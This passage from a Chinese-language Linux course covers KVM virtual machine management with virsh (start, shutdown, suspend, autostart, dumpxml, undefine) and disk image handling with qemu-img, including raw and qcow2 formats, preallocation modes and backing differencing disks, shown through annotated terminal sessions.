 Domain Monitoring (help keyword 'monitor'):
 Host and Hypervisor (help keyword 'host'):
 Interface (help keyword 'interface'):
 Network Filter (help keyword 'filter'):
 Networking (help keyword 'network'):
 Node Device (help keyword 'nodedev'):
 Secret (help keyword 'secret'):
 Snapshot (help keyword 'snapshot'):
 Storage Pool (help keyword 'pool'):
 Storage Volume (help keyword 'volume'):
 Virsh itself (help keyword 'virsh'):
```

##### 46.6.4.3 virsh命令格式

```
[root@centos8 ~]#virsh --help
virsh [options]... [<command_string>]
virsh [options]... <command> [args...]

 options:
    -c | --connect=URI     hypervisor connection URI
    -d | --debug=NUM       debug level [0-4]
    -e | --escape <char>    set escape sequence for console
    -h | --help             this help
    -k | --keepalive-interval=NUM
                           keepalive interval in seconds, 0 for disable
    -K | --keepalive-count=NUM
                           number of possible missed keepalive messages
    -l | --log=FILE         output logging to file
    -q | --quiet           quiet mode
    -r | --readonly         connect readonly
    -t | --timing           print timing information
    -v                     short version
    -V                     long version
         --version[=TYPE]   version, TYPE is short or long (default short)
```

##### 46.6.4.4 virsh子命令说明

```
help                   #打印基本帮助信息
attach-device          #使用XML文件中的设备定义在虚拟机中添加设备
attach-disk            #在虚拟机中附加新磁盘设备
attach-interface       #在虚拟机中附加新网络接口
create                 #从 XML 配置文件生成虚拟机并启动新虚拟机
define                 #为虚拟机输出XML配置文件
destroy                #强制虚拟机停止
detach-device          #从虚拟机中分离设备，使用同样的XML 描述作为命令
attach-device
detach-disk            #从虚拟机中分离磁盘设备
detach-interface       #从虚拟机中分离网络接口
domblkstat             #显示正在运行的虚拟机的块设备统计
domid                  #显示虚拟机ID
domifstat              #显示正在运行的虚拟机的网络接口统计
dominfo                #显示虚拟机信息
domname                #显示虚拟机名称
domstate               #显示虚以机状态
domuuid                #显示虚拟机UUID
dumpxml                #输出虚拟机 XML配置文件
list                   #列出所有虚拟机
migrate                #将虚拟机迁移到另一台主机中
nodeinfo               #有关管理程序的输出信息
quit                   #退出这个互动终端
reboot                 #重新启动虚拟机
restore                #恢复以前保存在文件中的虚拟机
resume                 #恢复暂停的虚拟机
save                   #将虚拟机当前状态保存到某个文件中
setmaxmem              #为管理程序设定内存上限
setmem                 #为虚拟机设定分配的内存
setvcpus               #修改为虚拟机分配的虚拟CPU数目
shutdown               #关闭某个虚拟机
start                  #启动未激活的虚拟机
suspend                #暂停虚拟机
undefine               #删除与虚拟机关联的所有文件
vepuinfo               #显示虚以机的虚拟CPU信息
vcpupin                #控制虚拟机的虚拟CPU亲和性
version                #显示virsh版本
```

##### 46.6.4.5 启动和关闭虚拟机

```
#查看当前启动的虚拟机
[root@centos8 ~]#virsh list 
 Id   Name                           State
----------------------------------------------------
1     Win_2008_r2-x86_64             running

#查看所有虚拟机
[root@centos8 ~]#virsh list --all
 Id   Name                           State
----------------------------------------------------
1     Win_2008_r2-x86_64             running
-     centos7                       shut off
-     centos8                       shut off
-     centos8-vm2                   shut off
-     centos8-vm3                   shut off
-     centos8-vm4                   shut off

#启动
[root@centos8 ~]#virsh start centos8
Domain centos8 started

[root@centos8 ~]#virsh list 
 Id   Name                           State
 ----------------------------------------------------
1     Win_2008_r2-x86_64             running
2     centos8                        running

#正常关机
[root@centos8 ~]#virsh shutdown 1
Domain 1 is being shutdown
[root@centos8 ~]#virsh list 
 Id   Name                           State
----------------------------------------------------
1     Win_2008_r2-x86_64             running
2     centos8                        running

#强制关机
[root@centos8 ~]#virsh destroy 1
Domain 1 destroyed

[root@centos8 ~]#virsh list 
 Id   Name                           State
----------------------------------------------------
2     centos8                       running

[root@centos8 ~]#virsh shutdown 2
Domain 2 is being shutdown

[root@centos8 ~]#virsh list 
 Id   Name                           State
----------------------------------------------------
```

##### 46.6.4.6 暂停和恢复虚拟机

```
[root@centos8 ~]#virsh list
 Id   Name                           State
----------------------------------------------------
1     centos8                       running

[root@centos8 ~]#virsh suspend centos8  #休眠
Domain centos8 suspended

[root@centos8 ~]#virsh list
 Id   Name                           State
----------------------------------------------------
1     centos8                       paused

#虚拟机暂停后,宿主机中还存有相关的进程
[root@centos8 ~]#ps aux|grep kvm
qemu        1699 36.9 16.0 4439296 1309300 ?     Sl   10:10   5:28 
/usr/libexec/qemu-kvm -name guest=centos8,debug-threads=on -S -object
secret,id=masterKey0,format=raw,file=/var/lib/libvirt/qemu/domain-
......
[root@centos8 ~]#virsh resume 1   #唤醒
Domain 1 resumed

[root@centos8 ~]#virsh list
 Id   Name                           State
----------------------------------------------------
1     centos8                       running
```

##### 46.6.4.7 配置虚拟机开机自动启动

```
[root@centos8 ~]#virsh list --all
 Id   Name                           State
----------------------------------------------------
1     Win_2008_r2-x86_64             running
-     centos7                       shut off
-     centos8                       shut off
-     centos8-vm2                   shut off
-     centos8-vm3                   shut off
-     centos8-vm4                   shut off

[root@centos8 ~]#virsh autostart centos8 
Domain centos8 marked as autostarted
   
   
[root@centos8 ~]#ll /etc/libvirt/qemu/autostart/
total 0
lrwxrwxrwx 1 root root 29 Sep 17 18:53 centos8.xml -> 
/etc/libvirt/qemu/centos8.xml
lrwxrwxrwx 1 root root 40 Sep 17 09:18 Win_2008_r2-x86_64.xml -> 
/etc/libvirt/qemu/Win_2008_r2-x86_64.xml

[root@centos8 ~]#virsh list 
 Id   Name                           State
----------------------------------------------------
1     Win_2008_r2-x86_64             running

[root@centos8 ~]#virsh autostart 1 --disable 
Domain 1 unmarked as autostarted


[root@centos8 ~]#ll /etc/libvirt/qemu/autostart/
total 0
lrwxrwxrwx 1 root root 29 Sep 17 18:53 centos8.xml -> 
/etc/libvirt/qemu/centos8.xml
[root@centos8 ~]#reboot
[root@centos8 ~]#virsh list 
 Id   Name                           State
----------------------------------------------------
1     centos8                       running
```

**在virt-manager工具中也可以配置开机自启动**

![1658720191151](linux体系.assets/1658720191151.png)

**46.6.4.8 查看虚拟机配置**

```
[root@centos8 ~]#virsh list --all
 Id   Name                           State
----------------------------------------------------
2     centos8                       running
-     centos7                       shut off
-     centos8-vm2                   shut off
-     centos8-vm3                   shut off
-     centos8-vm4                   shut off
-     Win_2008_r2-x86_64            shut off



#每个虚拟机配置都存放在/etc/libvirt/qemu目录下的xml文件中
[root@centos8 ~]#ls /etc/libvirt/qemu/ -l
total 32
drwxr-xr-x 2 root root   25 Sep 17 18:54 autostart
-rw------- 1 root root 3618 Sep 17 15:14 centos7.xml
-rw------- 1 root root 3673 Sep 13 22:43 centos8-vm2.xml
-rw------- 1 root root 3601 Sep 13 22:42 centos8-vm3.xml
-rw------- 1 root root 3379 Sep 14 00:15 centos8-vm4.xml
-rw------- 1 root root 6024 Sep 17 15:47 centos8.xml
drwx------ 3 root root   42 Sep 13 19:03 networks
-rw------- 1 root root 5369 Sep 17 11:31 Win_2008_r2-x86_64.xml



#查看指定虚拟机的配置,以下命令相当于查看 /etc/libvirt/qemu/centos8.xml
[root@centos8 ~]# virsh dumpxml centos8
[root@centos8 ~]# virsh dumpxml centos7
<domain type='kvm' id='7'>
  <name>centos7</name>
  <uuid>67a7e7f9-b25f-4141-8af9-f969c1dee2fb</uuid>
  <metadata>
    <libosinfo:libosinfo xmlns:libosinfo="http://libosinfo.org/xmlns/libvirt/domain/1.0">
      <libosinfo:os id="http://centos.org/centos/7.0"/>
    </libosinfo:libosinfo>
  </metadata>
  <memory unit='KiB'>1048576</memory>
  <currentMemory unit='KiB'>1048576</currentMemory>
  <vcpu placement='static'>2</vcpu>
  <resource>
    <partition>/machine</partition>
  </resource>
  <os>
    <type arch='x86_64' machine='pc-q35-rhel7.6.0'>hvm</type>
    <boot dev='hd'/>
  </os>
  <features>
    <acpi/>
    <apic/>
  </features>
  <cpu mode='custom' match='exact' check='full'>
    <model fallback='forbid'>Skylake-Client-IBRS</model>
    <vendor>Intel</vendor>
    <feature policy='require' name='ss'/>
    <feature policy='require' name='hypervisor'/>
    <feature policy='require' name='tsc_adjust'/>
    <feature policy='require' name='clflushopt'/>
    <feature policy='require' name='umip'/>
    <feature policy='require' name='md-clear'/>
    <feature policy='require' name='stibp'/>
    <feature policy='require' name='arch-capabilities'/>
    <feature policy='require' name='ssbd'/>
    <feature policy='require' name='xsaves'/>
    <feature policy='require' name='ibpb'/>
    <feature policy='require' name='rdctl-no'/>
    <feature policy='require' name='ibrs-all'/>
    <feature policy='require' name='skip-l1dfl-vmentry'/>
    <feature policy='require' name='mds-no'/>
    <feature policy='disable' name='hle'/>
    <feature policy='disable' name='erms'/>
    <feature policy='disable' name='rtm'/>
    <feature policy='disable' name='mpx'/>
  </cpu>
  <clock offset='utc'>
    <timer name='rtc' tickpolicy='catchup'/>
    <timer name='pit' tickpolicy='delay'/>
    <timer name='hpet' present='no'/>
  </clock>
  <on_poweroff>destroy</on_poweroff>
  <on_reboot>restart</on_reboot>
  <on_crash>destroy</on_crash>
  <pm>
    <suspend-to-mem enabled='no'/>
    <suspend-to-disk enabled='no'/>
  </pm>
  <devices>
    <emulator>/usr/libexec/qemu-kvm</emulator>
    <disk type='file' device='disk'>
      <driver name='qemu' type='qcow2'/>
      <source file='/var/lib/libvirt/images/centos7.qcow2'/>
      <backingStore/>
      <target dev='vda' bus='virtio'/>
      <alias name='virtio-disk0'/>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </disk>
    <disk type='file' device='cdrom'>
      <driver name='qemu'/>
      <target dev='sda' bus='sata'/>
      <readonly/>
      <alias name='sata0-0-0'/>
      <address type='drive' controller='0' bus='0' target='0' unit='0'/>
    </disk>
    <controller type='usb' index='0' model='qemu-xhci' ports='15'>
      <alias name='usb'/>
      <address type='pci' domain='0x0000' bus='0x02' slot='0x00' function='0x0'/>
    </controller>
    <controller type='sata' index='0'>
      <alias name='ide'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1f' function='0x2'/>
    </controller>
    <controller type='pci' index='0' model='pcie-root'>
      <alias name='pcie.0'/>
    </controller>
    <controller type='pci' index='1' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='1' port='0x10'/>
      <alias name='pci.1'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='2' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='2' port='0x11'/>
      <alias name='pci.2'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x1'/>
    </controller>
    <controller type='pci' index='3' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='3' port='0x12'/>
      <alias name='pci.3'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x2'/>
    </controller>
    <controller type='pci' index='4' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='4' port='0x13'/>
      <alias name='pci.4'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x3'/>
    </controller>
    <controller type='pci' index='5' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='5' port='0x14'/>
      <alias name='pci.5'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x4'/>
    </controller>
    <controller type='pci' index='6' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='6' port='0x15'/>
      <alias name='pci.6'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x5'/>
    </controller>
    <controller type='pci' index='7' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='7' port='0x16'/>
      <alias name='pci.7'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x6'/>
    </controller>
    <controller type='virtio-serial' index='0'>
      <alias name='virtio-serial0'/>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x0'/>
    </controller>
    <interface type='network'>
      <mac address='52:54:00:45:ef:a0'/>
      <source network='default' bridge='virbr0'/>
      <target dev='vnet0'/>
      <model type='virtio'/>
      <alias name='net0'/>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </interface>
    <serial type='pty'>
      <source path='/dev/pts/0'/>
      <target type='isa-serial' port='0'>
        <model name='isa-serial'/>
      </target>
      <alias name='serial0'/>
    </serial>
    <console type='pty' tty='/dev/pts/0'>
      <source path='/dev/pts/0'/>
      <target type='serial' port='0'/>
      <alias name='serial0'/>
    </console>
    <channel type='unix'>
      <source mode='bind' path='/var/lib/libvirt/qemu/channel/target/domain-7-centos7/org.qemu.guest_agent.0'/>
      <target type='virtio' name='org.qemu.guest_agent.0' state='disconnected'/>
      <alias name='channel0'/>
      <address type='virtio-serial' controller='0' bus='0' port='1'/>
    </channel>
    <input type='tablet' bus='usb'>
      <alias name='input0'/>
      <address type='usb' bus='0' port='1'/>
    </input>
    <input type='mouse' bus='ps2'>
      <alias name='input1'/>
    </input>
    <input type='keyboard' bus='ps2'>
      <alias name='input2'/>
    </input>
    <graphics type='vnc' port='5900' autoport='yes' listen='0.0.0.0'>
      <listen type='address' address='0.0.0.0'/>
    </graphics>
    <video>
      <model type='qxl' ram='65536' vram='65536' vgamem='16384' heads='1' primary='yes'/>
      <alias name='video0'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x0'/>
    </video>
    <memballoon model='virtio'>
      <stats period='5'/>
      <alias name='balloon0'/>
      <address type='pci' domain='0x0000' bus='0x05' slot='0x00' function='0x0'/>
    </memballoon>
    <rng model='virtio'>
      <backend model='random'>/dev/urandom</backend>
      <alias name='rng0'/>
      <address type='pci' domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
    </rng>
  </devices>
  <seclabel type='dynamic' model='dac' relabel='yes'>
    <label>+107:+107</label>
    <imagelabel>+107:+107</imagelabel>
  </seclabel>
</domain>
```

##### 46.6.4.8 删除虚拟机配置

```
[root@centos8 ~]#virsh list --all
 Id   Name                           State
----------------------------------------------------
2     centos8                       running
-     centos7                       shut off
-     centos8-vm2                   shut off
-     centos8-vm3                   shut off
-     centos8-vm4                   shut off
-     Win_2008_r2-x86_64            shut off


#删除虚拟机配置,但不删除磁盘文件
[root@centos8 ~]#virsh undefine centos8-vm4
Domain centos8-vm4 has been undefined
[root@centos8 ~]#virsh list --all
 Id   Name                           State
----------------------------------------------------
2     centos8                       running
-     centos7                       shut off
-     centos8-vm2                   shut off
-     centos8-vm3                   shut off
-     Win_2008_r2-x86_64            shut off


#对应虚拟机xml的配置文件被删除
[root@centos8 ~]#ll /etc/libvirt/qemu/
total 28
drwxr-xr-x 2 root root   25 Sep 17 18:54 autostart
-rw------- 1 root root 3618 Sep 17 15:14 centos7.xml
-rw------- 1 root root 3673 Sep 13 22:43 centos8-vm2.xml
-rw------- 1 root root 3601 Sep 13 22:42 centos8-vm3.xml
-rw------- 1 root root 6024 Sep 17 15:47 centos8.xml
drwx------ 3 root root   42 Sep 13 19:03 networks
-rw------- 1 root root 5369 Sep 17 11:31 Win_2008_r2-x86_64.xml


#对应的磁盘文件并没有删除
[root@centos8 ~]#ls /var/lib/libvirt/images/
centos7.qcow2 centos8.qcow2 centos8-vm2.qcow2 centos8-vm3.qcow2 centos8-
vm4.qcow2 Windows-2008_r2-x86_64.qcow2
```

### 46.7 存储管理

#### 46.7.1 KVM存储模式

```
通过存储池来简介存储的管理

基于文件系统的存储
  dir: Filesystem Directory 需要有挂载点的文件系统。
  fs: Pre-Formatted Block Device 无需挂载的文件系统,如:位于SAN存储的文件系统,可支持多个主机同时访问,而本地文件系统不支持。
  netfs: Network Exported Directory 网络文件系统,比如:NFS,SAMBA等。
  
基于设备的存储
无需文件系统,性能更好,但可管理性差,无法实现快照
  Disk: Physical Disk Device
  Iscsi: isCSI Target
  logical:LVM Volume Group
```

#### 46.7.2 虚拟磁盘类型

```
固定Fixed
  在配置时，指定磁盘大小
  不管在虚拟磁盘上实际存储多少数据，都将占用相同大小宿主机的磁盘空间

动态Dynamic
  初始空间占用小
  随着空间的使用逐渐增长到最大容量，但是只根据需求使用更多的空间
  
差异Differencing
  因为创建是差异磁盘，所以只保存变更的数据
  例如，将操作系统安装在父盘，然后创建差异化磁盘来执行进一步配置
```

#### 46.7.3  虚拟镜像文件格式

```
镜像文件储存在主机文件系统中。它可以储存在本地文件系统中，如 ext4 或 xfs；或网络文件系统中，如NFS 。例如 libguestfs 这样的工具，能管理、备份及监控文件。KVM上的磁盘镜像格式包括：

   -raw
此为默认磁盘格式,但并是一种真正的磁盘格式，而是代表虚拟机所使用的原始镜像,它并不存储元数据，因此可作为保证虚拟机兼容性的候选方案。然而，也正因为它不存储元数据，因此不支持某些高级特往，比如快照和压缩等格式简单，容易转换为其他的格式。

如果主机文件系统允许，raw 文件可以是预分配（pre-allocated）或 稀疏（sparse）。稀疏文件根据需求分配主机磁盘空间，因此它是一种精简配置形式（thin provisioning）。预分配文件的所有空间需要被预先分配，但它比稀疏文件性能好。当对磁盘 I/O 性能要求非常高，而且通常不需要通过网络传输镜像文件时，可以使用raw文件
 优点 : 性能好
 缺点 : 空间占用大,功能较少,生产不推荐使用
cow : copy-on-write格式，昙花一现
qcow : QEMU早期的copy-on-write格式，过渡性方案
qcow2
qcow2 镜像文件提供许多高级磁盘镜像特征，如快照、压缩及加密。它们可以用来代表通过模板镜像创建的虚拟机。因为只有虚拟机写入的扇区部分才会分配在镜像中，所以 qcow2 文件的网络传输效率较高。RHEL 7.0 及更新版本支持 qcow2 v3 镜像文件格式。
按需进行分配磁盘空间，不管文件系统是否支持
支持快照
支持zlib的磁盘压缩
支持AES的加密
优点 : 空间节约,功能丰富
缺点 : 性能较差,生产推荐使用
vmdk( Virtual Machine Disk ): VMware环境当中默认使用的磁盘格式
vhd \ vhdx ( Virtual Hard Disk ):微软默认采用的文件格式
vdi : VirtualBox 采用的文件格式
```

#### 46.7.4 使用qemu-img管理虚拟磁盘文件

##### 46.7.4.1 qemu-img概述

```
qemu-img 是一个功能强大的磁盘镜像管理工具
查看帮助: qemu-img --help
qemu-img 包括以下子命令
check          #检查完整性
create         #创建镜像
commit         #提交更改
compare        #比较
convert        #转换
info           #获得信息
map            #映射
snapshot       #快照管理
rebase         #在已有的镜像的基础上创建新的镜像
resize         #调整大小
amend          #修订镜像格式选项
```

##### 46.7.4.2 创建虚拟磁盘文件

```
create [-q] [--object objectdef] [-f fmt] [-b backing_file] [-F backing_fmt] [-u] [-o options] filename [size]
```

**创建默认配置的磁盘**

```
#默认为raw格式稀疏文件
[root@centos8 ~]#qemu-img create vm1.img 1g
Formatting 'vm1.img', fmt=raw size=1073741824
[root@centos8 ~]#file vm1.img 
vm1.img: data


#显示文件大小
[root@centos8 ~]#ll -h vm1.img
-rw-r--r-- 1 root root 1.0G Sep 20 12:17 vm1.img


#实际文件只占4k空间
[root@centos8 ~]#du -h vm1.img 
4.0K vm1.img


#显示文件信息
[root@centos8 ~]#qemu-img info vm1.img 
image: vm1.img
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 4.0K
```

**查看不同磁盘文件格式支持选项**

```
[root@centos8 ~]#qemu-img create -f raw -o ?
Supported options:
size             Virtual disk size


[root@centos8 ~]# qemu-img create -f qcow2 -o ?
Supported options:
size             Virtual disk size
compat           Compatibility level (0.10 or 1.1)
backing_file     File name of a base image
backing_fmt      Image format of the base image
encryption       Encrypt the image with format 'aes'. (Deprecated in favor of encrypt.format=aes)
encrypt.format   Encrypt the image, format choices: 'aes', 'luks'
encrypt.key-secret ID of secret providing qcow AES key or LUKS passphrase
encrypt.cipher-alg Name of encryption cipher algorithm
encrypt.cipher-mode Name of encryption cipher mode
encrypt.ivgen-alg Name of IV generator algorithm
encrypt.ivgen-hash-alg Name of IV generator hash algorithm
encrypt.hash-alg Name of encryption hash algorithm
encrypt.iter-time Time to spend in PBKDF in milliseconds
cluster_size     qcow2 cluster size
preallocation    Preallocation mode (allowed values: off, metadata, falloc, full)
lazy_refcounts   Postpone refcount updates
refcount_bits    Width of a reference count entry in bits
```

**qcow2格式选项**

```
backing_file     	#指定后端镜像文件。
backing_fmt      	#设置后端镜像的镜像格式。
cluster_size     	#设置镜像中的簇大小，取值在512到2M之间，默认值为64K。
preallocation    	#设置镜像文件空间的预分配模式
encryption       	#用于设置加密
```

**创建raw格式非稀疏文件**

```
[root@centos8 ~]#dd if=/dev/zero of=vm2.img bs=1M count=1024
1024+0 records in
1024+0 records out
1073741824 bytes (1.1 GB, 1.0 GiB) copied, 3.20332 s, 335 MB/s

[root@centos8 ~]#qemu-img info vm2.img 
image: vm2.img
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 1.0G

[root@centos8 ~]#ls -hl vm2.img
-rw-r--r-- 1 root root 1.0G Sep 20 12:31 vm2.img
[root@centos8 ~]#du -h vm2.img
1.0G vm2.img
```

**创建raw格式稀疏文件**

```
[root@centos8 ~]#dd if=/dev/zero of=vm3.img bs=1M count=0 seek=1024
0+0 records in
0+0 records out
0 bytes copied, 9.2173e-05 s, 0.0 kB/s


[root@centos8 ~]#qemu-img info vm3.img 
image: vm3.img
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 0


[root@centos8 ~]#ll -h vm3.img 
-rw-r--r-- 1 root root 1.0G Sep 20 12:34 vm3.img
[root@centos8 ~]#du -h vm3.img
0 vm3.img
```

**raw文件复制的格式控制**

```
#复制非稀疏文件,默认也为非稀疏文件
[root@centos8 ~]#cp vm2.img vm2.img.bak
[root@centos8 ~]#du -h vm2.img.bak
1.0G vm2.img.bak
[root@centos8 ~]#ll -h vm2.img.bak
-rw-r--r-- 1 root root 1.0G Sep 20 12:38 vm2.img.bak
[root@centos8 ~]#qemu-img info vm2.img.bak
image: vm2.img.bak
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 1.0G


#复制稀疏文件,默认仍为稀疏文件
[root@centos8 ~]#cp vm3.img vm3.img.bak
[root@centos8 ~]#ll -h vm3.img.bak
-rw-r--r-- 1 root root 1.0G Sep 20 12:36 vm3.img.bak
[root@centos8 ~]#du -h vm3.img.bak
0 vm3.img.bak
[root@centos8 ~]#qemu-img info vm3.img.bak 
image: vm3.img.bak
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 0 


#指定将非稀疏文件复制为稀疏格式格式
[root@centos8 ~]#cp --sparse=always vm2.img vm2.img.bak2
[root@centos8 ~]#qemu-img info vm2.img
image: vm2.img
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 1.0G
[root@centos8 ~]#qemu-img info vm2.img.bak2
image: vm2.img.bak2
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 0 


#指定将稀疏文件复制为非稀疏格式格式
[root@centos8 ~]#cp --sparse=never vm3.img vm3.img.bak2
[root@centos8 ~]#qemu-img info vm3.img
image: vm3.img
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 0
[root@centos8 ~]#qemu-img info vm3.img.bak2
image: vm3.img.bak2
file format: raw
virtual size: 1.0G (1073741824 bytes)
disk size: 1.0G
```

##### 46.7.4.3 检查虚拟磁盘

```
#对于关机状态的虚拟机磁盘,可以检查文件错误
[root@centos8 ~]#virsh list
 Id   Name                           State
----------------------------------------------------
2     centos8                       running

[root@centos8 ~]#qemu-img check /var/lib/libvirt/images/centos8.qcow2 
qemu-img: Could not open '/var/lib/libvirt/images/centos8.qcow2': Failed to get
shared "write" lock
Is another process using the image [/var/lib/libvirt/images/centos8.qcow2]?

[root@centos8 ~]#virsh suspend centos8
Domain centos8 suspended

[root@centos8 ~]#virsh list
 Id   Name                           State
----------------------------------------------------
2     centos8                       paused

[root@centos8 ~]#qemu-img check /var/lib/libvirt/images/centos8.qcow2 
qemu-img: Could not open '/var/lib/libvirt/images/centos8.qcow2': Failed to get
shared "write" lock
Is another process using the image [/var/lib/libvirt/images/centos8.qcow2]?


[root@centos8 ~]#qemu-img check /var/lib/libvirt/images/centos7.qcow2 
No errors were found on the image.
25572/327680 = 7.80% allocated, 1.44% fragmented, 0.00% compressed clusters
Image end offset: 1676869632
```

##### 46.7.4.4  磁盘预分配策略

```
#1.概述
raw文件的预分配策略和文件系统是否支持有关,而qcow2则无关。
预分配策略

off
此为缺省策略，即不使用预分配策略,预分配后的虚拟磁盘占用空间很小,不属于稀疏映像类型,生成的磁盘文件很小。

metadata
只预分配元数据(metadata)，预分配后的磁盘文件属于稀疏映像类型,相当于vmware中的磁盘置备选项: Thin Provision(精简配置)。

falloc
分配文件的块并标识它们的状态为未初始化，即只分配空间,但不置零. 预分配后的虚拟磁盘属于非稀疏映像类型,相对full模式来说，创建虚拟磁盘的速度要快很多,相当于vmware中的磁盘置备选项: 厚置备延迟置零。

full
分配所有磁盘空间并置零，预分配后的虚拟磁盘属于非稀疏映像类型,创建最慢,相当于vmware中的磁盘置备选项: 厚置备置零。





#2.案例：创建预分配置策略
[root@centos8 ~]#qemu-img create -f qcow2 test1.qcow2 1g
Formatting 'test1.qcow2', fmt=qcow2 size=1073741824 cluster_size=65536
lazy_refcounts=off refcount_bits=16
[root@centos8 ~]#qemu-img info test1.qcow2 
image: test1.qcow2
file format: qcow2
virtual size: 1.0G (1073741824 bytes)
disk size: 196K
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
   
   
#指定关闭预分配
[root@centos8 ~]#qemu-img create -f qcow2 test2.qcow2 1g -o preallocation=off
Formatting 'test2.qcow2', fmt=qcow2 size=1073741824 cluster_size=65536
preallocation=off lazy_refcounts=off refcount_bits=16
[root@centos8 ~]#qemu-img info test2.qcow2 
image: test2.qcow2
file format: qcow2
virtual size: 1.0G (1073741824 bytes)
disk size: 196K
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
   
   
#指定预分配metadata
[root@centos8 ~]#qemu-img create -f qcow2 test3.qcow2 1g -o 
preallocation=metadata
Formatting 'test3.qcow2', fmt=qcow2 size=1073741824 cluster_size=65536
preallocation=metadata lazy_refcounts=off refcount_bits=16
[root@centos8 ~]#qemu-img info test3.qcow2 
image: test3.qcow2
file format: qcow2
virtual size: 1.0G (1073741824 bytes)
disk size: 836K
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
   
   
#指定预分配falloc
[root@centos8 ~]#qemu-img create -f qcow2 test4.qcow2 1g -o preallocation=falloc
Formatting 'test4.qcow2', fmt=qcow2 size=1073741824 cluster_size=65536
preallocation=falloc lazy_refcounts=off refcount_bits=16
[root@centos8 ~]#qemu-img info test4.qcow2 
image: test4.qcow2
file format: qcow2
virtual size: 1.0G (1073741824 bytes)
disk size: 1.0G
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
   
   
#指定预分配full
[root@centos8 ~]#qemu-img create -f qcow2 test5.qcow2 1g -o preallocation=full
Formatting 'test5.qcow2', fmt=qcow2 size=1073741824 cluster_size=65536
preallocation=full lazy_refcounts=off refcount_bits=16
[root@centos8 ~]#qemu-img info test5.qcow2 
image: test5.qcow2
file format: qcow2
virtual size: 1.0G (1073741824 bytes)
disk size: 1.0G
cluster_size: 65536
Format specific information:
   compat: 1.1
   lazy refcounts: false
   refcount bits: 16
   corrupt: false
   
   
#文件系统显示大小
[root@centos8 ~]#ll -h test*.qcow2
-rw-r--r-- 1 root root 193K Sep 20 13:31 test1.qcow2
-rw-r--r-- 1 root root 193K Sep 20 13:32 test2.qcow2
-rw-r--r-- 1 root root 1.1G Sep 20 13:35 test3.qcow2
-rw-r--r-- 1 root root 1.1G Sep 20 13:36 test4.qcow2
-rw-r--r-- 1 root root 1.1G Sep 20 13:37 test5.qcow2


#查看真实大小
[root@centos8 ~]#du -h test*.qcow2
196K test1.qcow2
196K test2.qcow2
836K test3.qcow2
1.1G test4.qcow2
1.1G test5.qcow2
```

##### 46.7.4.5 后备差异虚拟磁盘

![1658745108916](linux体系.assets/1658745108916.png)

```
有很多虚拟机中磁盘的内容有很多相同的部分,可以使用后备差异虚拟磁盘节约磁盘的占用。
先创建一个镜像磁盘,并在磁盘中安装相同的应用配置,用此磁盘文件做为为模版,在此基础上建立多个后备差异虚拟磁盘文件,再分别分配给需求不同的虚拟机使用,后备差异虚拟磁盘相当于Vmware中的链接克隆。
 
后备差异虚拟磁盘特点
  存储与基础镜像（父）磁盘的变化。
  基础镜像（父）磁盘不会改变。
  差异磁盘隔离变化。
  多个差异磁盘可以使用相同的基础镜像（父）磁盘。
优点: 标准化基础镜像，节省空间。
缺点: 增加了开销，较差的性能。
```

**创建后备差异虚拟磁盘并用virt-install启动虚拟机**

```
#1.创建后备差异虚拟磁盘命令
qemu-img create -f qcow2  -o backing_file=base.qcow2(或者raw)  diff.qcow2
#注意:模版镜像文件可以是raw或qcow2,但是后备差异磁盘文件必须是qcow2格式



#2.范例
[root@centos8 ~]# cd /var/lib/libvirt/images/
[root@centos8 images]#  qemu-img create -f qcow2 -o backing_file=centos8.qcow2 centos8-test1.qcow2
Formatting 'centos8-test1.qcow2', fmt=qcow2 size=21474836480 backing_file=centos8.qcow2 cluster_size=65536 lazy_refcounts=off refcount_bits=16

[root@centos8 images]# qemu-img info centos8-test1.qcow2
image: centos8-test1.qcow2
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 196K
cluster_size: 65536
backing file: centos8.qcow2
Format specific information:
    compat: 1.1
    lazy refcounts: false
    refcount bits: 16
    corrupt: false


[root@centos8 images]# qemu-img info centos8.qcow2
image: centos8.qcow2
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 20G
cluster_size: 65536
Format specific information:
    compat: 1.1
    lazy refcounts: true
    refcount bits: 16
    corrupt: false



#基于已安装系统的磁盘文件直接启动虚拟机
#注意模版镜像磁盘对应的虚拟机需要是关机状态才可以创建新的虚拟机
